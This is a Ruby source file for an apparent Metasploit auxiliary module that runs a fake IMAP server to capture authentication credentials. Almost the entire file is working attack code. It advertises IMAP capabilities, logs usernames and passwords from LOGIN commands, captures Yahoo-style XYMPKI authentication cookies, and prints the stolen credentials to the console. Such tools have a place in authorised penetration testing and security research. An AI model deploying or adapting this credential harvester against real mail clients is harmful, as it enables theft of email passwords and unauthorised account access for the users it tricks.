##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::TcpServer
  include Msf::Auxiliary::Report


  def initialize
    super(
      'Name'        => 'Authentication Capture: IMAP',
      'Description'    => %q{
        This module provides a fake IMAP service that
      is designed to capture authentication credentials.
      },
      'Author'      => ['ddz', 'hdm'],
      'License'     => MSF_LICENSE,
      'Actions'     =>
        [
          [ 'Capture' ]
        ],
      'PassiveActions' =>
        [
          'Capture'
        ],
      'DefaultAction'  => 'Capture'
    )

    register_options(
      [
        OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 143 ])
      ], self.class)
  end

  def setup
    super
    @state = {}
  end

  def run
    print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}...")
    exploit()
  end

  def on_client_connect(c)
    @state[c] = {:name => "#{c.peerhost}:#{c.peerport}", :ip => c.peerhost, :port => c.peerport, :user => nil, :pass => nil}
    c.put "* OK IMAP4\r\n"
  end

  def on_client_data(c)
    data = c.get_once
    return if not data
    num,cmd,arg = data.strip.split(/\s+/, 3)
    arg ||= ""

    if(cmd.upcase == "CAPABILITY")
      c.put "* CAPABILITY IMAP4 IMAP4rev1 IDLE LOGIN-REFERRALS " +
        "MAILBOX-REFERRALS NAMESPACE LITERAL+ UIDPLUS CHILDREN UNSELECT " +
        "QUOTA XLIST XYZZY LOGIN-REFERRALS AUTH=XYMCOOKIE AUTH=XYMCOOKIEB64 " +
        "AUTH=XYMPKI AUTH=XYMECOOKIE ID\r\n"
      c.put "#{num} OK CAPABILITY completed.\r\n"
    end

    if(cmd.upcase == "AUTHENTICATE" and arg.upcase == "XYMPKI")
      c.put "+ \r\n"
      cookie1 = c.get_once
      c.put "+ \r\n"
      cookie2 = c.get_once
      report_auth_info(
        :host      => @state[c][:ip],
        :sname     => 'imap-yahoo',
        :port      => datastore['SRVPORT'],
        :source_type => "captured",
        :user      => cookie1,
        :pass      => cookie2
      )
      return
    end

    if(cmd.upcase == "LOGIN")
      @state[c][:user], @state[c][:pass] = arg.split(/\s+/, 2)

      report_auth_info(
        :host      => @state[c][:ip],
        :port      => datastore['SRVPORT'],
        :sname     => 'imap',
        :user      => @state[c][:user],
        :pass      => @state[c][:pass],
        :active    => true
      )
      print_status("IMAP LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}")
      return
    end

    if(cmd.upcase == "LOGOUT")
      c.put("* BYE IMAP4rev1 Server logging out\r\n")
      c.put("#{num} OK LOGOUT completed\r\n")
      return
    end

    @state[c][:pass] = data.strip
    c.put "#{num} NO LOGIN FAILURE\r\n"
    return

  end

  def on_client_close(c)
    @state.delete(c)
  end


end
